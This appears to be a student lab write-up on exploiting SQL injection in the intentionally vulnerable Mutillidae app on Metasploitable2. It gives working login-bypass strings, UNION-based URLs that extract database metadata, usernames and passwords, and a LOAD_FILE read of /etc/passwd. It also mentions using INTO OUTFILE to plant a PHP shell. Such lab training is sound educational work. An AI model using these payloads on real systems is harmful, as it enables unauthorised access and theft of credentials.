# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/21a44dae-17ef-445e-8e3e-f6887342840d)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/1e1a5822-242c-4003-aa6c-66f08e993113)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/5c730c10-6eba-4370-96da-d21a991ac645)

Click on the menu Login/Register and register for an account

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/f787fea8-ff49-4ac4-9154-022281634f08)

Click on the link “Please register here”

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/d3c237ef-ae7a-4e58-b730-2b08e23c5511)

Click on “Create Account” to display the following page:

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/f64bc9a0-ab8c-464a-b4cc-5cf73ff80334)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/382d11c4-3f40-4b06-a4d1-12db17fd6366)

Click “Login”. The logged in page will show as below:

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/c382b5d4-638f-43fa-bd88-03c9eb9fac05)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/981a4d8f-03f5-460b-ab51-5b855789e0ea)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/dae92206-7feb-44fc-aea7-463c297a1fb7)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/c1665f77-8846-4aac-8df0-e8a89c5e6e7d)

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/0864b35c-3307-4456-827e-155a153da8da)

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/7cad6dce-a226-4d4c-808f-4d956039a67a)

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/d75b50d4-cec4-46e6-a38f-221e3db762f4)

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/c91d56c8-32d9-4d0b-b2b9-6c0f9856f938)


From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/57b3d0f1-2dfa-496c-96b6-e1ac13d5ae67)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/d50ee44a-915b-4166-9013-da8bbdfb2f39)


After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/e8e67646-71bd-47df-8b28-518f9196e9a0)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/516c8650-c780-4ce9-b464-b24ec70325f8)

As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/7764e0cf-cf4d-4071-8377-b101ebbfde7b)


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/a57301a3-11f9-43a9-b0f7-865d5506ed84)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/fd7fc05f-4e7e-4e1d-8dee-5653f8d37252)
 
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/36558653-1e2a-479b-8368-ae17704d458e)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/651855b8-3f92-4148-b62f-38356faced36)

The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/a56b2569-1143-4981-9381-3743321843da)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/2659bdf5-a1fc-4894-8255-83d3b103ff58)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/4ef15324-2b13-4ef0-943d-c5559b98fe48)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/sathyaa22/sqlinjection/assets/140483368/d1414d8c-d5b6-4bb1-8b6e-665ad9a850c3)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
